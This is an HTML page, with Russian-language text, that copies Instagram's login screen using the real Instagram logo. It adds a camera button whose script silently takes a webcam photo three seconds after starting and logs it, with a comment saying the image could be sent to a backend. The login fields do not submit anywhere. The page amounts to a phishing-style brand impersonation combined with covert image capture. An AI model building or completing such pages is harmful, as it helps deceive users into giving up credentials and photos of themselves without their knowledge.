<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="instagram-wrapper">
        <div class="instagram-phone">
            <img src="https://i.imgur.com/zqpwkLQ.png" alt="Instagram Phone">
        </div>
        <div class="instagram-login">
            <div class="group">
                <img class="logo" src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram">
                <div class="login-form">
                    <input type="text" placeholder="Телефон, имя пользователя или эл. адрес">
                    <input type="password" placeholder="Пароль">
                    <button class="login-button">Войти</button>
                </div>
                <div class="or-divider"><span>ИЛИ</span></div>
                <a href="#" class="fb-login">Войти через Facebook</a>
                <a href="#" class="forgot-password">Забыли пароль?</a>
            </div>
            <div class="signup">
                <p>У вас ещё нет аккаунта? <a href="#">Зарегистрироваться</a></p>
            </div>

            <button class="camera-button" onclick="startCamera()">Открыть камеру</button>
            <video id="camera" autoplay></video>
            <canvas id="photo" style="display:none;"></canvas>
        </div>
    </div>

    <script>
        async function startCamera() {
            const video = document.getElementById('camera');
            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
            video.srcObject = stream;

            // Фотографирование через 3 секунды после запуска (пример)
            setTimeout(() => {
                const canvas = document.getElementById('photo');
                const context = canvas.getContext('2d');
                canvas.width = video.videoWidth;
                canvas.height = video.videoHeight;
                context.drawImage(video, 0, 0, canvas.width, canvas.height);

                const photo = canvas.toDataURL('image/jpeg');
                // Здесь можно отправить фото на backend
                console.log(photo);
            }, 3000);
        }
    </script>
</body>
</html>
